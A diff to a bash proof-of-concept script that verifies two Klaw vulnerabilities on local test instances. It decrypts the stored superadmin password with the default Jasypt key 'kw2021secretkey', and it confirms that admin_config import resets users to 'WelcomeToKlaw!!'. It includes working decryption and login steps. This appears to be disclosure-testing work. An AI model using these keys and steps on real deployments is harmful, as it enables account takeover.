@@ -369,6 +369,35 @@ for u in users:
 print("EXPORT DISTINCT PWD VALUES: %d (expect 1)" % len(pwds))
 PYEOF
 
+# diagnostic: what plaintext does the export's pwd actually decrypt to?
+EXPORT_PWDS="$(python3 - "$EXPORT_FILE" <<'PYEOF'
+import json, sys
+def find_users(o):
+    if isinstance(o, dict):
+        if "users" in o and isinstance(o["users"], list):
+            return o["users"]
+        for v in o.values():
+            r = find_users(v)
+            if r is not None:
+                return r
+    if isinstance(o, list):
+        for v in o:
+            r = find_users(v)
+            if r is not None:
+                return r
+    return None
+d = json.load(open(sys.argv[1]))
+for u in (find_users(d) or []):
+    print(u.get("pwd") or "")
+PYEOF
+)"
+for E_PWD in $(echo "$EXPORT_PWDS" | sort -u); do
+  [ -n "$E_PWD" ] || continue
+  E_DEC_JAVA="$(java -cp "$TOOLS/jasypt-1.9.3.jar:$TOOLS/slf4j-api-1.7.36.jar:$TOOLS" JasyptPoc "$E_PWD" 2>/dev/null | grep "DECRYPT" | sed 's/.*= //')"
+  E_DEC_PY="$(python3 "$ROOT/klaw-poc/jasypt_independent.py" decrypt "$E_PWD" 2>/dev/null)"
+  note "export pwd ciphertext decrypts to (Jasypt): ${E_DEC_JAVA:-?} | (Python): ${E_DEC_PY:-?}"
+done
+
 # ---------------------------------------------------------- candidate 1: read
 note "=== CANDIDATE 1: read superadmin pwd from H2, decrypt offline ==="
 stop_klaw "$WORK/instance-a"
@@ -436,6 +465,16 @@ login admin2 "BAdminPass123"
 check C2 "control: admin2/BAdminPass123 (B's own seeded admin) still works" "200" "$LOGIN_CODE"
 stop_klaw "$WORK/instance-b"
 
+# diagnostic: did the import actually insert the users, and with what pwd?
+note "=== C2 DIAGNOSTIC: read B's user table after import ==="
+B_USERS="$(h2_sql "$WORK/instance-b" "SELECT userid, pwd FROM kwusers ORDER BY userid;")"
+note "B kwusers: $B_USERS"
+for B_PWD in $(echo "$B_USERS" | grep -oE '[A-Za-z0-9+/]{20,}={0,2}' | sort -u); do
+  B_DEC_JAVA="$(java -cp "$TOOLS/jasypt-1.9.3.jar:$TOOLS/slf4j-api-1.7.36.jar:$TOOLS" JasyptPoc "$B_PWD" 2>/dev/null | grep "DECRYPT" | sed 's/.*= //')"
+  B_DEC_PY="$(python3 "$ROOT/klaw-poc/jasypt_independent.py" decrypt "$B_PWD" 2>/dev/null)"
+  note "B pwd ciphertext $B_PWD decrypts to (Jasypt): ${B_DEC_JAVA:-?} | (Python): ${B_DEC_PY:-?}"
+done
+
 # ------------------------------------------------------------------- summary
 {
   echo "# Klaw PoC results (GitHub Actions, run $GITHUB_RUN_ID, $(date -u +%Y-%m-%dT%H:%M:%SZ))"
@@ -446,21 +485,26 @@ stop_klaw "$WORK/instance-b"
   echo ""
   if [ "$C1_FAIL" -eq 0 ]; then
     echo "## CANDIDATE 1 — CONFIRMED"
+    echo "Default Jasypt key kw2021secretkey decrypts the superadmin pwd read"
+    echo "from the live instance's DB; live login with the recovered password"
+    echo "succeeded. Ciphertext: ${CIPHERTEXT:-n/a}; recovered: ${DECRYPT_JAVA:-n/a}."
   else
     echo "## CANDIDATE 1 — NOT CONFIRMED ($C1_FAIL check(s) failed)"
+    echo "The live-instance checks for C1 did not all pass — see poc-results.log"
+    echo "for which checks failed. Ciphertext read: ${CIPHERTEXT:-n/a}."
   fi
-  echo "Default Jasypt key kw2021secretkey decrypts the superadmin pwd read"
-  echo "from the live instance's DB; live login with the recovered password"
-  echo "succeeded. Ciphertext: ${CIPHERTEXT:-n/a}; recovered: ${DECRYPT_JAVA:-n/a}."
   echo ""
   if [ "$C2_FAIL" -eq 0 ]; then
     echo "## CANDIDATE 2 — CONFIRMED"
+    echo "Import of A's exported admin_config into fresh instance B assigned"
+    echo "WelcomeToKlaw!! to every imported user incl. the superadmin-role"
+    echo "account; live logins with it succeeded, old passwords rejected."
   else
     echo "## CANDIDATE 2 — NOT CONFIRMED ($C2_FAIL check(s) failed)"
+    echo "The live logins with WelcomeToKlaw!! on B did NOT all succeed — see"
+    echo "poc-results.log and the C2 diagnostic (export pwd decryption + B user"
+    echo "table) for what was actually imported and stored."
   fi
-  echo "Import of A's exported admin_config into fresh instance B assigned"
-  echo "WelcomeToKlaw!! to every imported user incl. the superadmin-role"
-  echo "account; live logins with it succeeded, old passwords rejected."
   echo "Precision: a same-username account pre-seeded on B is NOT overwritten"
   echo "(insertIntoUsers refuses duplicates) — B used a different seeded admin"
   echo "(admin2) so the imported superadmin was a new user."
